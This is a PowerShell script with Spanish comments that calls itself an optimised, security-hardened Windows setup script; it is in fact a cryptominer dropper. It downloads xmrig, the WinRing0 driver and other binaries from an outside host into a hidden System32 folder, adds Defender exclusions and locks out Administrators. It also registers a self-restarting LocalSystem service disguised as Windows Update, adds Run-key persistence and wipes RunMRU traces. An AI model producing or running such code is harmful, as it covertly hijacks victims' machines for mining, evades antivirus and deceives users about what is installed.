# Script optimizado para Windows 10/11 con medidas de seguridad reforzadas
# REQUIERE EJECUCIÓN COMO ADMINISTRADOR

# Verificar privilegios de administrador
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Este script requiere privilegios de administrador." -ForegroundColor Red
    exit
}

# Configuración de ejecución
$ErrorActionPreference = "SilentlyContinue"
Set-ExecutionPolicy Bypass -Scope Process -Force

# URL base para descargas (ejemplo)
$baseURL = "https://baa4ts.is-a-good.dev"

# Rutas con nombres aleatorizados
$randomDir = "System32\LogFiles\WMI" + (Get-Random -Minimum 1000 -Maximum 9999)
$root = Join-Path $env:WINDIR $randomDir

# Crear directorio oculto
if (-not (Test-Path -Path $root)) {
    New-Item -Path $root -ItemType Directory -Force | Out-Null
    attrib +s +h "$root"  # Ocultar y marcar como sistema
}

# Establecer variable de entorno ofuscada
[Environment]::SetEnvironmentVariable("WINAPP", [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($env:USERNAME)), "Machine")

# Configurar permisos restrictivos
try {
    $acl = Get-Acl -Path $root
    $acl.SetAccessRuleProtection($true, $false)  # Deshabilitar herencia
    
    # Denegar acceso a todos los usuarios excepto SYSTEM
    $systemSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
    $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        $systemSID, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow"
    )
    $acl.AddAccessRule($systemRule)
    
    # Denegar acceso a Administrators
    $adminsSID = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    $denyAdminsRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
        $adminsSID, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Deny"
    )
    $acl.AddAccessRule($denyAdminsRule)
    
    Set-Acl -Path $root -AclObject $acl
}
catch {
    Write-Host "Error configurando permisos: $($_.Exception.Message)" -ForegroundColor Yellow
}

# Configurar exclusiones de Defender
try {
    Add-MpPreference -ExclusionPath $root -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "xmrig.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "Win2Internals.exe" -ErrorAction SilentlyContinue
}
catch {
    Write-Host "Advertencia: No se pudieron configurar exclusiones de Defender" -ForegroundColor Yellow
}

# Descargar archivos
$files = @("Win2Internals.exe", "WinRing0x64.sys", "wroom.dll", "xmrig.exe")
foreach ($file in $files) {
    try {
        $filePath = Join-Path $root $file
        Invoke-WebRequest -Uri "$baseURL/$file" -OutFile $filePath -UseBasicParsing
    }
    catch {
        Write-Host "Error descargando $file" -ForegroundColor Red
    }
}

# Configurar servicio con nombre aleatorio
$serviceName = "WinUpdate" + (Get-Random -Minimum 100 -Maximum 999)
try {
    if (Get-Service $serviceName -ErrorAction SilentlyContinue) {
        Stop-Service $serviceName -Force -ErrorAction SilentlyContinue
        sc.exe delete $serviceName | Out-Null
    }
    
    $servicePath = Join-Path $root "Win2Internals.exe"
    sc.exe create $serviceName binPath= "$servicePath" start= auto obj= "LocalSystem" type= own
    sc.exe description $serviceName "Proporciona servicios de actualización de Windows"
    sc.exe sdset $serviceName "D:(A;;GA;;;SY)(A;;GA;;;BA)"  # Solo SYSTEM y Administrators acceso
    
    # Configurar recuperación automática
    sc.exe failure $serviceName reset= 60 actions= restart/60000/restart/60000/restart/60000
    sc.exe failureflag $serviceName 1
    
    Start-Service $serviceName -ErrorAction SilentlyContinue
}
catch {
    Write-Host "Error configurando servicio: $($_.Exception.Message)" -ForegroundColor Red
}

# Ocultar proceso y registros (técnicas avanzadas)
try {
    # Configurar para ejecutar al inicio mediante registro
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $hiddenValue = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("$root\Win2Internals.exe"))
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value $hiddenValue -Force
    
    # Deshabilitar volcado de memoria para el proceso
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -Name "DontShowUI" -Value 1 -Force
}
catch {
    Write-Host "Error configurando persistencia: $($_.Exception.Message)" -ForegroundColor Yellow
}

# Limpiar evidencias
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force -ErrorAction SilentlyContinue
[System.GC]::Collect()

Write-Host "Configuración completada" -ForegroundColor Green
